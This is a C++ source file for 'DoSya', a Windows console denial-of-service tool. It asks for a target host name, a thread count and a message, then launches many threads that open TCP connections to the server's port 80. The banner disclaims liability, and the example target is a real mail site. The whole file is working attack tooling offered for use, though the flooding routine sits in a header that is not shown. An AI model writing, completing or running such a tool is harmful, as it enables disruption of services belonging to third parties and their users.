#include "thread_functions.h"
#include "io_extended.h"
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable: 4996)

int main(void)
{
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	std::cout << "DoSya v1.03 by NightGhost" << std::endl
		<< "makes lots of TCP connections on port 80 (HTTP) with the server" << std::endl
		<< "the author is not liable for user actions" << std::endl
		<< "use at your own risk" << std::endl;

	WSADATA filler;

	if (WSAStartup(0x0202, &filler))
	{
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
		std::cerr << "Can't start up: " << WSAGetLastError() << std::endl;

		WSACleanup();

		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);

		system("pause");
		return EXIT_FAILURE;
	}

	std::cout << std::endl << "DoSya is ready. Please enter the remote host name, number of threads" << std::endl
		<< "and your message to server. For example: mail.ru 9000 FUCK YOU!!!11!!" << std::endl
		<< "ATTENTION: you can type not more than 256 symbols for each parameter" << std::endl << std::endl
		<< "host name >> ";

	char h_name[MAX_BYTE], message[MAX_BYTE];
	long num;

	//input
	std::cin >> h_name;
	std::cout << "number of threads >> ";
	check_error(std::cin, num);
	std::cout << "message to host >> ";
	std::cin.clear();
	clear_istream(std::cin);
	std::cin.getline(message, MAX_BYTE);

	//receiving the data
	HOSTENT* remote_host_info = gethostbyname(h_name);

	if (remote_host_info == NULL)
	{
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
		std::cerr << "Can't receive data about remote host" << std::endl;
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);

		WSACleanup();

		system("pause");
		return EXIT_FAILURE;
	}

	std::cout << "Remote host name: " << remote_host_info->h_name << std::endl
		<< "Address type: ";
	switch (remote_host_info->h_addrtype)
	{
	case AF_INET :
		std::cout << "IPv4" << std::endl;
		break;
	case AF_INET6 :
		std::cerr << "IPv6" << std::endl
			<< "Sorry, but now we can't attack servers based on IPv6. Bye!" << std::endl;

		WSACleanup();

		system("pause");
		return EXIT_FAILURE;
	}
	if (remote_host_info->h_aliases[0])
	{
		std::cout << "Remote host domain aliases: " << std::endl;

		for (int i = 0; remote_host_info->h_aliases[i]; i++)
		{
			std::cout << remote_host_info->h_aliases[i] << std::endl;
		}
	}
	else
		std::cout << "Server have no aliases" << std::endl;

	in_addr* temp = new in_addr;
	if (remote_host_info->h_addr_list[1])
	{
		std::cout << "IPv4 addresses: " << std::endl;
		for (int i = 0; remote_host_info->h_addr_list[i]; i++)
		{
			(*temp).s_addr = *(u_long*)remote_host_info->h_addr_list[i];
			std::cout << inet_ntoa(*temp) << std::endl;
		}
	}
	else
	{
		(*temp).s_addr = *(u_long*)remote_host_info->h_addr;
		std::cout << "IPv4 address: " << inet_ntoa(*temp) << std::endl;
	}

	delete temp;

	make_delay();

	//begin
	std::mutex out_obj;
	std::vector<std::thread> threads;

	for (int i = 0; i < num; i++)
		threads.push_back(std::thread(make_dos_overthread, *remote_host_info, ref(out_obj), message, num));

	std::for_each(threads.begin(), threads.end(), std::mem_fn(&std::thread::join));

	return EXIT_SUCCESS;
}
